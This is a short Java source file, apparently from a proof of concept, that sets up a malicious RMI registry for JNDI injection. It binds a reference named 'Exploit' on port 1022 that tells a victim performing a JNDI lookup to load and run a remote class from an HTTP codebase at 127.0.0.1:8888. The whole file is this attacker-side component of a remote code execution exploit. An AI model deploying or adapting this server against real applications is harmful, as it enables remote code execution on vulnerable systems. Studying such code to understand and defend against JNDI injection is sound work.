package server;


import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


class JNDIServer {
    public static void start() throws AlreadyBoundException, RemoteException, NamingException {


        Registry registry = LocateRegistry.createRegistry(1022);

        Reference reference = new javax.naming.Reference("Exploit","Exploit","http://127.0.0.1:8888/");
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
        registry.bind("Exploit", referenceWrapper);
    }
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        start();
    }
}
